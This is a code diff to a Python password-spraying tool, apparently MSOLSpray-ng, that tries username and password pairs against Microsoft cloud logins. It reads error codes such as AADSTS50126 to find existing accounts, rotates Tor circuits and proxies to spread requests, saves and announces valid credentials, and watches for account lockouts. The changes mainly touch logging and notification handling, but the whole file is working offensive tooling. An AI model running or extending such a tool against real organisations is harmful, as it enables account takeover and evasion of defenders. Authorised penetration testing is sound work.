@@ -108,7 +108,7 @@ def remove_credential(credentials: List[str], cred: str, separator: str):
     Returns:
         None: The function modifies the credentials list in place.
     """
-    username = cred.split(separator)[0]
+    username = cred.split(separator, maxsplit=1)[0]
     if cred in credentials:
         try:
             credentials.remove(cred)
@@ -198,18 +198,22 @@ def post_processing(username, password, auth_result, credentials, args) -> dict:
         pass
 
     if is_valid:
+        print_debug(f"Writing valid credential {username}{args.sep}{password} to file")
         # Write result to file
         with open(args.out, "a", encoding="utf-8") as f:
             f.write(cred_msg + "\n")
-        if args.notify and not args.notify_each:
+        if args.notify and args.notify_each:
+            print_debug("Sending notification to user (valid credential).")
             msg = "Found valid credentials! (-.^)\n\n"
             msg += cred_msg
-            notify(args.notify, msg)
+            try:
+                notify(args.notify, msg)
+                print_debug("Sent notification to user (valid credential).")
+            except BaseException as e:
+                print_error(f"Could not send notification: {e}")
 
-    if should_remove:
-        if args.verbose:
-            print_debug(f"Removing credential {username}{args.sep}{password} from list")
-        remove_credential(credentials, f"{username}{args.sep}{password}", args.sep)
+    else:
+        print_debug(f"Credential {username}{args.sep}{password} is not valid")
 
     return {"cred_msg": cred_msg, "should_remove": should_remove}
 
@@ -217,7 +221,7 @@ def post_processing(username, password, auth_result, credentials, args) -> dict:
 def parse_response(username, password, error, verbose) -> AuthResult:
     if "AADSTS50126" in error:
         if verbose:
-            print_debug(
+            print_info(
                 f"Invalid username or password. Username: {username} could exist."
             )
         return AuthResult.INVALID_PASSWORD
@@ -315,8 +319,7 @@ def try_all_credentials(
     if args.tor:
         socks_list = generate_tor_circuits_urls(args.socks_port, args.tor_pool)
         proxy_list = [{"http": s, "https": s} for s in socks_list]
-        if args.verbose:
-            print_debug(f"Using {len(proxy_list)} Tor circuits.")
+        print_debug(f"Using {len(proxy_list)} Tor circuits.")
 
     print_info(f"There are {creds_count} credentials in total to try.")
     print_info(f"Current date and time: {time.ctime()}")
@@ -325,6 +328,7 @@ def try_all_credentials(
         shuffle(credentials)
 
     for cindex, cred in enumerate(credentials):
+        result = None
         if interrupt:
             break
 
@@ -343,8 +347,7 @@ def try_all_credentials(
         proxies = None
         if proxy_list:
             proxies = proxy_list[cindex % len(proxy_list)]
-            if args.verbose:
-                print_debug(f"Using proxy {proxies['http']} for this request")
+            print_debug(f"Using proxy {proxies['http']} for this request")
 
         r = try_login(
             url, username, password, args, start_time, retries=3, proxies=proxies
@@ -356,7 +359,7 @@ def try_all_credentials(
 
         if r.status_code == 200:
             print_success(f"SUCCESS! {username} : {password}")
-            _ = post_processing(
+            result = post_processing(
                 username,
                 password,
                 AuthResult.SUCCESS,
@@ -408,11 +411,14 @@ def try_all_credentials(
                     + "Do you want to continue this spray?"
                 )
                 if args.notify_actions:
-                    notify(
-                        args.notify_actions,
-                        "[MSOLSpray-ng] Multiple account lockouts detected! Waiting for "
-                        + "user interaction...",
-                    )
+                    try:
+                        notify(
+                            args.notify_actions,
+                            "[MSOLSpray-ng] Multiple account lockouts detected! Waiting for "
+                            + "user interaction...",
+                        )
+                    except BaseException as e:
+                        print_error(f"Could not send notification: {e}")
                 yes = {"yes", "y"}
                 no = {"no", "n", ""}
                 lockout_question = True
@@ -431,12 +437,23 @@ def try_all_credentials(
                     break
                 # else: continue even though lockout is detected
 
+        if result["should_remove"]:
+            print_debug(f"Removing any other credentials for user {username}")
+            remove_credential(credentials, f"{username}{args.sep}{password}", args.sep)
+
     if len(results_list) > 0:
         print_info(f"Results have been written to {args.out}.")
         if args.notify:
-            msg = "Found valid credentials! (-.^)\n\n"
-            msg += "\n".join(results_list)
-            notify(args.notify, msg)
+            # Avoid sending duplicate notifications if notify_each is set and
+            # only one valid credential is found
+            if not (args.notify_each and len(results_list) == 1):
+                msg = "Found valid credentials! (-.^)\n\n"
+                msg += "\n".join(results_list)
+                try:
+                    notify(args.notify, msg)
+                    print_debug("Sent notification to user (all credentials).")
+                except BaseException as e:
+                    print_error(f"Could not send notification: {e}")
         results_list.clear()
 
     return users_to_remove
